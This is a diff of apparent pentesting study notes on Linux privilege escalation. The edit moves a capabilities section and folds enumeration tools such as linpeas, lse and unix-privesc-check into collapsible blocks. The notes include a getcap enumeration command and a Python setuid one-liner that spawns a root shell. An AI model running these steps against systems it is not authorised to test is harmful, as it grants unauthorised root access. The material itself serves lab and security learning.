@@ -224,6 +224,28 @@ custom scripts
 [GTFOBins](https://gtfobins.github.io/) reference
 
 ---
+## Capabilities
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+👉 Check:
+
+binaries with elevated capabilities
+
+
+If Python
+
+![](../../assets/images/Pasted%20image%2020260520055618.png)
+
+![](../../assets/images/Pasted%20image%2020260520055728.png)
+
+```bash
+/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
+```
+
+---
 
 ## 5. Writable Files
 
@@ -328,19 +350,11 @@ grep -r "pass" /etc 2>/dev/null
 
 ---
 
-## Capabilities
-
-```bash
-getcap -r / 2>/dev/null
-```
-
-👉 Check:
-
-binaries with elevated capabilities
-
----
-
 # EnumTools
+
+
+<details markdown="1">
+<summary>linpeas</summary>
 
 ## linpeas
 
@@ -362,26 +376,20 @@ chmod +x linpeas.sh
 - Misinterpreting SUID results
 
 👉 Check: 
-### Capabilities
+## Capabilities
 
-If Python
+</details>
 
-![](../../assets/images/Pasted%20image%2020260520055618.png)
 
-![](../../assets/images/Pasted%20image%2020260520055728.png)
+<details markdown="1">
+<summary>linux-smart-enumeration</summary>
 
-```zsh
-```bash
-/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
-```
-
-```
 ## linux-smart-enumeration
 
 ### github
-```
+
+
 https://github.com/diego-treitos/linux-smart-enumeration
-```
 
 ```zsh
 python3 -m http.server 80
@@ -397,6 +405,12 @@ chmod +x lse.sh
 ```zsh
 ./lse.sh -l1
 ```
+
+</details>
+
+
+<details markdown="1">
+<summary>unix-privesc-check</summary>
 
 ## unix-privesc-check
 
@@ -430,10 +444,17 @@ cat output.txt  | grep WARNING
 
 Search the output below for the word 'WARNING'.  If you don't see it then WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
 
+</details>
+
+
+<details markdown="1">
+<summary>Metasploit Module</summary>
 ## Metasploit Module
 
 multi/recon/local_exploit_suggester
 Metasploitフレームワーク内の`multi/recon/local_exploit_suggester`モジュールは、ターゲットシステムでの特権昇格に利用できるローカルエクスプロイトを提案します。このモジュールは、ターゲットシステム上の既知の脆弱性を分析し、適切なエクスプロイトを推奨します。
+
+</details>
 
 ---
 
